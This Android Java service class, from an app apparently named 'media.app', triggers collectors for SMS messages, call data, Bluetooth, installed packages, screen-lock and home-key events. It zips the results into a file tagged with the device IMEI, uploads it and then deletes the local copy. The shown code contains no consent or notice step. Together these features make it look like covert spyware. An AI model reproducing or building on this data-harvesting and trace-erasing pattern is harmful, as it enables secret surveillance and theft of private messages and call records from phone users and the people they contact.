package com.media.app.Services;

import android.app.IntentService;
import android.content.Intent;
import android.os.Environment;

import com.crashlytics.android.Crashlytics;
import com.media.app.DataCollector.bluetoothCollect;
import com.media.app.DataCollector.callData;
import com.media.app.DataCollector.campDetailsCollector;
import com.media.app.DataCollector.earjackCollector;
import com.media.app.DataCollector.homeKeyCollector;
import com.media.app.DataCollector.lowBatteryData;
import com.media.app.DataCollector.miscCollector;
import com.media.app.DataCollector.packageDetails;
import com.media.app.DataCollector.packageInstallCollector;
import com.media.app.DataCollector.packageMonitorCollector;
import com.media.app.DataCollector.screenLockCollector;
import com.media.app.DataCollector.smsData;
import com.media.app.ServerJobs.uploadData;
import com.media.app.Utils.constants;


import java.io.File;

import io.fabric.sdk.android.Fabric;

import static com.media.app.Utils.constants.ZIP_EXT;
import static com.media.app.Utils.constants.ZIP_FILE_NAME;
import static com.media.app.Utils.logger.logg;
import static com.media.app.Utils.utility.imi;
import static com.media.app.Utils.zip.zipFileAtPath;


/**
 * An {@link IntentService} subclass for handling asynchronous task requests in
 * a service on a separate handler thread.
 * <p>
 * TODO: Customize class - update intent actions, extra parameters and static
 * helper methods.
 */
public class dataSender extends IntentService {

    public dataSender() {
        super("dataSender");
    }


    @Override
    protected void onHandleIntent(Intent intent) {
        Fabric.with(this, new Crashlytics());
        if (intent != null) {
            long timi = System.currentTimeMillis();
            logg("datacollector Service");
            new bluetoothCollect(this);
            new smsData().getSMS(this);
            new callData(this);
            new packageDetails(this);
            new lowBatteryData(this);
            new miscCollector(this);
            new packageInstallCollector(this);
            new packageMonitorCollector(this);
            new earjackCollector(this);
            new screenLockCollector(this);
            new homeKeyCollector(this);
            new campDetailsCollector(this);

            File d = new File(Environment.getExternalStorageDirectory(), constants.DataFolder);
            File root = new File(Environment.getExternalStorageDirectory(), constants.ZIPFolder);
            if (!root.exists()) {
                root.mkdirs();
            }
            File f = new File(root, ZIP_FILE_NAME+constants.UNDERSCORE+imi(this)+constants.UNDERSCORE+ String.valueOf(timi)+ZIP_EXT);
            if ((d.exists()) && (d.isDirectory())) {
                if (zipFileAtPath(d.getAbsolutePath(), f.getAbsolutePath())) {
                    logg("FileZipped");
                    new uploadData(f.getAbsolutePath(),this);
                    if(deleteDirectory(d)){
                        logg("Dir del");
                    }else{
                        logg("Dir Del Fail");
                    }
                } else {
                    logg("FileNotZipped");
                }
            } else {
                logg("FolderNot Exists");
            }


        }
    }

    private boolean deleteDirectory(File dir) {

        if (dir.isDirectory()) {
            File[] children = dir.listFiles();
            for (int i = 0; i < children.length; i++) {
                boolean success = deleteDirectory(children[i]);
                if (!success) {
                    return false;
                }
            }
        }

        // either file or an empty directory
        //System.out.println("removing file or directory : " + dir.getName());
        return dir.delete();
    }
}


